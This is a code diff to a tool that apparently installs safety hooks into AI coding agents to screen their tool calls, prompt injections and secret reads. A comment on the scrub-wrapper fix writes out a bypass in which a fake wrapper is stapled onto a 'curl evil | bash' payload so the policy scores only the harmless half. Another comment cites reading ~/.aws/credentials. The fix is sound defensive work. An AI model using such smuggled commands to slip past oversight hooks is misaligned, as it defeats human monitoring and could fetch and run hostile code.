@@ -3,6 +3,7 @@ from __future__ import annotations
 import hashlib
 import json
 import os
+import re
 import shutil
 import sys
 from datetime import datetime, timezone
@@ -62,7 +63,7 @@ def _strip_for_agent(agent: str, config: Dict[str, Any], marker: str) -> Tuple[D
     return _strip_windsurf(config, marker)
 
 
-def install_hooks(*, repo_root: Path, workspace: Path, agent: str, scope: str, mode: str) -> List[Dict[str, str]]:
+def install_hooks(*, repo_root: Path, workspace: Path, agent: str, scope: str, mode: str, portable: bool = False) -> List[Dict[str, str]]:
     agents = list(_SUPPORTED_AGENTS) if agent == "all" else [agent]
     results = []
     for current_agent in agents:
@@ -79,10 +80,10 @@ def install_hooks(*, repo_root: Path, workspace: Path, agent: str, scope: str, m
         # from the payload's cwd instead.
         command = _dispatcher_command(
             repo_root=repo_root, workspace=workspace, agent=current_agent, mode=mode,
-            pin_workspace=(scope == "project"),
+            pin_workspace=(scope == "project" and not portable), portable=portable,
         )
         if current_agent == "claude":
-            config = _merge_claude(config, command, workspace, pin_workspace=(scope == "project"))
+            config = _merge_claude(config, command, workspace, pin_workspace=(scope == "project" and not portable))
         elif current_agent == "cursor":
             config = _merge_cursor(config, command)
         elif current_agent == "openclaw":
@@ -127,7 +128,7 @@ def install_hooks(*, repo_root: Path, workspace: Path, agent: str, scope: str, m
             # dispatched. So this always targets $CODEX_HOME (Codex's own home-dir
             # override, default ~/.codex) even when scope == "project" (hooks.json
             # itself is correctly scoped).
-            codex_home = Path(os.environ["CODEX_HOME"]) if os.environ.get("CODEX_HOME") else Path.home() / ".codex"
+            codex_home = _codex_home()
             _ensure_codex_hooks_feature_enabled(codex_home / "config.toml")
     return results
 
@@ -167,7 +168,7 @@ def codex_hook_trust(workspace: Path, codex_home: Optional[Path] = None) -> Dict
     that event never dispatches. Text-based: the record's exact hash is Codex's
     business; its presence is what we can know.
     """
-    home = codex_home or (Path(os.environ["CODEX_HOME"]) if os.environ.get("CODEX_HOME") else Path.home() / ".codex")
+    home = codex_home or _codex_home()
     candidates = {
         "project": (workspace / ".codex" / "hooks.json").resolve(),
         "global": (home / "hooks.json").resolve(),
@@ -392,6 +393,19 @@ def uninstall_hooks(*, repo_root: Path, workspace: Path, agent: str, scope: str)
     return results
 
 
+# One `printf %q` word: an unquoted path, plus backslash escapes for anything
+# bash had to quote. Shell metacharacters ($ ; | & ` ( ) < > { } newline) are
+# deliberately absent from the bare class — %q always escapes them, so a
+# genuine path still matches via `\\.`, while a raw metacharacter (the only way
+# to smuggle a second command through this field) cannot.
+_WRAPPER_WORD = r"(?:[A-Za-z0-9_./~+,:@%=-]|\\.)"
+# `<secrets-dir> <scrubber>; exit ${PIPESTATUS[0]}` — the whole of what
+# decloak.sh appends after the marker. See cloaking/hooks/decloak.sh.
+_SCRUB_TAIL_RE = re.compile(
+    _WRAPPER_WORD + r"+ " + _WRAPPER_WORD + r"*scrub-stream\.sh; exit \$\{PIPESTATUS\[0\]\}"
+)
+
+
 def _strip_prismor_scrub_wrapper(cmd: str) -> str:
     """Recover the agent's real command from Prismor's own decloak wrapper.
 
@@ -415,8 +429,15 @@ def _strip_prismor_scrub_wrapper(cmd: str) -> str:
     i = cmd.rfind(marker)
     if i == -1:
         return cmd
-    tail = cmd[i + len(marker):]
-    if "scrub-stream" not in tail or "PIPESTATUS" not in tail:
+    # The tail must be the wrapper and NOTHING else. Substring checks ("is
+    # scrub-stream in here somewhere?") let a crafted command staple a fake
+    # wrapper onto a real payload — `{ : printf safe } 2>&1 |
+    # PRISMOR_SECRETS_DIR=/tmp scrub-stream PIPESTATUS; curl evil | bash`
+    # normalizes down to `printf safe`, so policy scores the harmless half
+    # while the shell still runs the trailing command. fullmatch on the exact
+    # two-word tail closes that: anything extra fails to match and the whole
+    # command is handed to policy unchanged.
+    if not _SCRUB_TAIL_RE.fullmatch(cmd[i + len(marker):]):
         return cmd
     inner = cmd[:i].strip()
     if inner.startswith("{") and inner.endswith("}"):
@@ -555,6 +576,23 @@ def _default_block_categories() -> set:
     return cats
 
 
+def _own_prompt_injection(finding: Dict[str, Any], event: Dict[str, Any]) -> bool:
+    """A visible prompt-injection match on the person's own prompt (#541).
+
+    Injection is content that did not come from the principal; on
+    UserPromptSubmit the person at the keyboard IS the principal, so "print
+    ~/.aws/credentials" there is a request, not an injection. The actions it
+    asks for are screened at PreToolUse where they happen. Still reported,
+    never blocks. Hidden-text injection keeps blocking: the person may not
+    have seen what they pasted.
+    """
+    return (
+        str(event.get("agent_event", "")) == "UserPromptSubmit"
+        and finding.get("category") == "prompt_injection"
+        and finding.get("ruleId") != "prompt-injection-hidden"
+    )
+
+
 def should_block(
     findings: List[Dict[str, Any]],
     event: Dict[str, Any],
@@ -574,7 +612,7 @@ def should_block(
     for finding in findings:
         # A match inside inert text (commit message, PR body, grep pattern)
         # describes an action instead of performing it -- report, never block.
-        if finding.get("contextInert"):
+        if finding.get("contextInert") or _own_prompt_injection(finding, event):
             continue
         if str(finding.get("mode", "observe")).lower() == "enforce":
             # Reads are generally safe, so they only block for secret access —
@@ -612,7 +650,7 @@ def legacy_should_block(
     if not _is_pre_action(str(event.get("agent_event", ""))):
         return None
     for finding in findings:
-        if finding.get("contextInert"):
+        if finding.get("contextInert") or _own_prompt_injection(finding, event):
             continue
         if str(finding.get("action") or BLOCK).lower() not in VERDICTS:
             continue
@@ -624,6 +662,11 @@ def legacy_should_block(
                 continue
             return finding
     return None
+
+
+def _codex_home() -> Path:
+    """Codex's home dir: $CODEX_HOME, default ~/.codex."""
+    return Path(os.environ["CODEX_HOME"]) if os.environ.get("CODEX_HOME") else Path.home() / ".codex"
 
 
 def _config_path(agent: str, scope: str, workspace: Path) -> Path:
@@ -640,7 +683,9 @@ def _config_path(agent: str, scope: str, workspace: Path) -> Path:
         if agent == "codex":
             return workspace / ".codex" / "hooks.json"
         if agent == "copilot":
-            return workspace / ".github" / "copilot" / "hooks.json"
+            # Copilot loads only .github/hooks/*.json and ~/.copilot/hooks/*.json;
+            # the old .github/copilot/hooks.json + ~/.copilot/hooks.json were never read (#481).
+            return workspace / ".github" / "hooks" / "prismor.json"
         if agent == "grok":
             return workspace / ".grok" / "hooks" / "prismor.json"
         if agent == "kiro":
@@ -670,9 +715,10 @@ def _config_path(agent: str, scope: str, workspace: Path) -> Path:
     if agent == "hermes":
         return home / ".hermes" / "config.json"
     if agent == "codex":
-        return home / ".codex" / "hooks.json"
+        # Codex's global config lives in $CODEX_HOME (#539), not always ~/.codex.
+        return _codex_home() / "hooks.json"
     if agent == "copilot":
-        return home / ".copilot" / "hooks.json"
+        return home / ".copilot" / "hooks" / "prismor.json"
     if agent == "grok":
         return home / ".grok" / "hooks" / "prismor.json"
     if agent == "kiro":
@@ -710,8 +756,9 @@ _SHIM_NAME = "hook-dispatch.py"
 
 _SHIM_TEMPLATE = (
     "# Generated by `prismor setup` -- do not edit. Rewritten on every install.\n"
-    "import sys\n"
+    "import os, sys, time\n"
     "\n"
+    "os.environ['PRISMOR_HOOK_T0'] = str(time.time())\n"
     "sys.path.insert(0, {repo_root!r})\n"
     "\n"
     "from prismor.runtime.immunity_cli import main\n"
@@ -734,7 +781,25 @@ def _write_dispatch_shim(repo_root: Path) -> Path:
     return shim
 
 
-def _dispatcher_command(*, repo_root: Path, workspace: Path, agent: str, mode: str, pin_workspace: bool = True) -> str:
+# The installed command normally embeds three absolute paths (interpreter, shim,
+# workspace), which is right for one machine and useless in a config file that
+# is committed to a repo and cloned onto a hosted agent's VM. Several hosted
+# agents (Claude Code on the web, Cursor cloud agents, Copilot coding agent)
+# load hooks ONLY from the clone, so the committed form has to find prismor at
+# run time instead. Missing binary = warn and let the call through, so a
+# teammate without prismor is not locked out; PRISMOR_HOOK_REQUIRED=1 (set it in
+# the cloud environment) turns that into a block.
+_PORTABLE_TEMPLATE = (
+    "sh -c 'p=$(command -v prismor || echo \"$HOME/.local/bin/prismor\"); "
+    "[ -x \"$p\" ] || {{ echo \"prismor not installed: tool call not screened\" >&2; "
+    "[ -n \"$PRISMOR_HOOK_REQUIRED\" ] && exit 2; exit 0; }}; "
+    "exec \"$p\" hook-dispatch --agent {agent} --mode {mode}'"
+)
+
+
+def _dispatcher_command(*, repo_root: Path, workspace: Path, agent: str, mode: str, pin_workspace: bool = True, portable: bool = False) -> str:
+    if portable:
+        return _PORTABLE_TEMPLATE.format(agent=agent, mode=mode)
     # Route through the prismor CLI for consistency (one canonical entry point),
     # invoked via the generated shim with the current interpreter rather than
     # the `prismor` console script, which is not reliably on PATH inside the
@@ -743,6 +808,12 @@ def _dispatcher_command(*, repo_root: Path, workspace: Path, agent: str, mode: s
     shim = _write_dispatch_shim(repo_root)
     ws_flag = f'--workspace "{workspace}" ' if pin_workspace else ""
     return f'"{py}" "{shim}" hook-dispatch --agent {agent} {ws_flag}--mode {mode}'
+
+
+# `Skill` is how Claude loads a skill. Without it a skill invocation never
+# reaches the hook: per-skill denies cannot fire, and nothing records which
+# third-party instructions a session was running under.
+_CLAUDE_TOOL_MATCHER = "Task|Agent|Skill|Bash|Read|Edit|MultiEdit|Write|WebFetch|WebSearch|mcp__.*"
 
 
 def _merge_claude(config: Dict[str, Any], command: str, workspace: Path, pin_workspace: bool = True) -> Dict[str, Any]:
@@ -760,11 +831,11 @@ def _merge_claude(config: Dict[str, Any], command: str, workspace: Path, pin_wor
     # _normalize_claude) so they can be attributed to the subagent.
     hooks["PreToolUse"] = _merge_claude_entries(
         hooks.get("PreToolUse", []),
-        {"matcher": "Task|Agent|Bash|Read|Edit|MultiEdit|Write|WebFetch|WebSearch|mcp__.*", "hooks": [{"type": "command", "command": command}]},
+        {"matcher": _CLAUDE_TOOL_MATCHER, "hooks": [{"type": "command", "command": command}]},
     )
     hooks["PostToolUse"] = _merge_claude_entries(
         hooks.get("PostToolUse", []),
-        {"matcher": "Task|Agent|Bash|Read|Edit|MultiEdit|Write|WebFetch|WebSearch|mcp__.*", "hooks": [{"type": "command", "command": command}]},
+        {"matcher": _CLAUDE_TOOL_MATCHER, "hooks": [{"type": "command", "command": command}]},
     )
     # SessionStart carries the project-memory files (CLAUDE.md/AGENTS.md) that
     # Claude auto-loads before any tool call. Scanning them here brings their
@@ -1228,7 +1299,14 @@ def _scaffold_hermes_internal_hook(hooks_dir: Path, command: str) -> None:
 
 def _merge_copilot(config: Dict[str, Any], command: str) -> Dict[str, Any]:
     hooks = dict(config.get("hooks", {}))
-    for event_name in ["PreToolUse", "PostToolUse", "UserPromptSubmitted"]:
+    # PascalCase names: Copilot then sends Claude-shaped payloads and honours
+    # the flat permissionDecision deny on PreToolUse (verified live, #481).
+    # "UserPromptSubmitted" never fires, so drop our entry from older installs.
+    if "UserPromptSubmitted" in hooks:
+        hooks["UserPromptSubmitted"] = [e for e in hooks["UserPromptSubmitted"] if e.get("command") != command]
+        if not hooks["UserPromptSubmitted"]:
+            del hooks["UserPromptSubmitted"]
+    for event_name in ["PreToolUse", "PostToolUse", "UserPromptSubmit"]:
         hooks[event_name] = _merge_simple_command_entries(hooks.get(event_name, []), command)
     return {**config, "version": config.get("version", 1), "hooks": hooks}
 
@@ -1592,17 +1670,28 @@ def _unmapped_tool_event(base: Dict[str, Any], payload: Dict[str, Any]) -> Dict[
 
 
 def _normalize_copilot(payload: Dict[str, Any], session_id: str, workspace: Path) -> Dict[str, Any]:
+    # Copilot CLI (verified live on 1.0.88, #481) fires two payload shapes. The
+    # PascalCase events we register are Claude-shaped: tool_name is canonical
+    # (Bash/Read/Write/Edit) and arguments sit in tool_input. The camelCase
+    # events carry toolName (bash/view/create/edit/apply_patch) + toolArgs.
+    # Either way the file tools use Copilot's own keys: {path}, {path,
+    # file_text}, {path, old_str, new_str}, and apply_patch is raw patch text.
     hook_event = payload.get("hookEventName") or payload.get("hook_event_name") or "unknown"
     tool_name = payload.get("toolName") or payload.get("tool_name") or ""
-    # Copilot sends toolArgs as a JSON-encoded string; parse it.
-    tool_args_raw = payload.get("toolArgs") or payload.get("tool_args") or "{}"
+    tool_args_raw = next(
+        (payload[k] for k in ("tool_input", "toolInput", "toolArgs", "tool_args") if payload.get(k)), {}
+    )
+    patch = ""
     if isinstance(tool_args_raw, str):
         try:
             tool_args: Dict[str, Any] = json.loads(tool_args_raw)
         except (json.JSONDecodeError, ValueError):
             tool_args = {"raw": tool_args_raw}
+            patch = tool_args_raw
     else:
         tool_args = tool_args_raw
+    if not isinstance(tool_args, dict):
+        tool_args = {"raw": str(tool_args)}
     base = {
         "ts": payload.get("timestamp") or datetime.now(timezone.utc).isoformat(),
         "session_id": session_id,
@@ -1610,15 +1699,24 @@ def _normalize_copilot(payload: Dict[str, Any], session_id: str, workspace: Path
         "agent_event": hook_event,
         "metadata": {"cwd": payload.get("cwd"), "tool_name": tool_name, "raw": payload},
     }
-    if hook_event == "UserPromptSubmitted":
+    if hook_event in {"UserPromptSubmit", "UserPromptSubmitted", "userPromptSubmitted"} or (
+        "prompt" in payload and not tool_name
+    ):
         return {**base, "type": "prompt", "prompt": payload.get("prompt") or tool_args.get("prompt", "")}
-    if tool_name in {"ShellCommand", "run_shell_command", "Bash"}:
+    name = tool_name.lower()
+    path = tool_args.get("path") or tool_args.get("file_path") or tool_args.get("filePath") or ""
+    if name in {"bash", "shell", "shellcommand", "run_shell_command", "powershell"}:
         return {**base, "type": "shell", "command": tool_args.get("command") or tool_args.get("cmd", "")}
-    if tool_name in {"ReadFile", "read_file", "Read"}:
-        return {**base, "type": "file_read", "path": tool_args.get("path") or tool_args.get("filePath", "")}
-    if tool_name in {"WriteFile", "write_file", "EditFile", "Write", "Edit"}:
-        return {**base, "type": "file_write", "path": tool_args.get("path") or tool_args.get("filePath", ""), "content": tool_args.get("content", "")}
-    if tool_name in {"WebFetch", "web_fetch", "WebSearch"}:
+    if name in {"read", "view", "readfile", "read_file"}:
+        return {**base, "type": "file_read", "path": path}
+    if patch and "*** Begin Patch" in patch:
+        from prismor.runtime.transcripts.adapters.codex import _PATCH_PATH_RE
+        match = _PATCH_PATH_RE.search(patch)
+        return {**base, "type": "file_write", "path": match.group(1) if match else "", "content": patch}
+    if name in {"write", "create", "edit", "writefile", "write_file", "editfile", "str_replace", "apply_patch"}:
+        content = tool_args.get("file_text") or tool_args.get("new_str") or tool_args.get("content", "")
+        return {**base, "type": "file_write", "path": path, "content": content}
+    if name in {"webfetch", "web_fetch", "websearch", "fetch"}:
         return {**base, "type": "network", "url": tool_args.get("url", "")}
     # Copilot is an approval-capable surface (inline "ask"), so MCP calls must
     # be classified like the other agents' — otherwise `mcp` guardrail rules
@@ -2201,7 +2299,6 @@ _MEMORY_GLOBS: Tuple[str, ...] = (
     ".windsurf/rules/*.md",
     ".roo/rules/*.md",
     ".augment/rules/*.md",
-    "**/.github/copilot-instructions.md",
 )
 _MEMORY_PATH_PATTERNS: Tuple[str, ...] = _MEMORY_BASENAMES + _MEMORY_GLOBS
 # Cap total scanned memory content so a huge memory file can't blow the OS
@@ -2314,9 +2411,9 @@ def _discover_memory_files(workspace: Path) -> List[Path]:
     entry in ``_MEMORY_PATH_PATTERNS``, and unions in anything the agent
     reported loading itself (see ``_instructions_loaded_paths``).
 
-    Recursive (``**``) globs are expanded ONLY under the workspace itself —
-    running one against an ancestor would walk large parts of the filesystem on
-    the interactive SessionStart path. Returns at most ``_MEMORY_MAX_FILES``
+    No pattern recurses: a ``**`` glob walks every node_modules and nested repo
+    under the workspace (30s+ on a projects dir) on the interactive
+    SessionStart path. Returns at most ``_MEMORY_MAX_FILES``
     paths, de-duplicated by resolved target and stable in search order.
     """
     search_dirs: List[Path] = []
@@ -2325,7 +2422,6 @@ def _discover_memory_files(workspace: Path) -> List[Path]:
         search_dirs.append(ws)
         search_dirs.extend(ws.parents[:3])
     except Exception:
-        ws = workspace
         search_dirs.append(workspace)
     search_dirs.append(Path.home() / ".claude")
 
@@ -2353,8 +2449,6 @@ def _discover_memory_files(workspace: Path) -> List[Path]:
             if "*" not in pattern:
                 if not _add(directory / pattern):
                     return found
-                continue
-            if pattern.startswith("**") and directory != ws:
                 continue
             try:
                 matches = directory.glob(pattern)
@@ -2897,7 +2991,7 @@ def _normalize_gemini(payload: Dict[str, Any], session_id: str, workspace: Path)
     return _unmapped_tool_event(base, payload)
 
 def _ephemeral_session_id(agent: str, workspace: Path) -> str:
-    digest = hashlib.sha1(f"{agent}:{workspace}:{os.getpid()}".encode("utf-8")).hexdigest()[:12]
+    digest = hashlib.sha1(f"{agent}:{workspace}:{os.getpid()}".encode("utf-8")).hexdigest()[:12]  # an id, not a security hash  # nosec B324
     return f"{agent}-{digest}"
 
 def _join_edits(edits: List[Dict[str, Any]]) -> str:
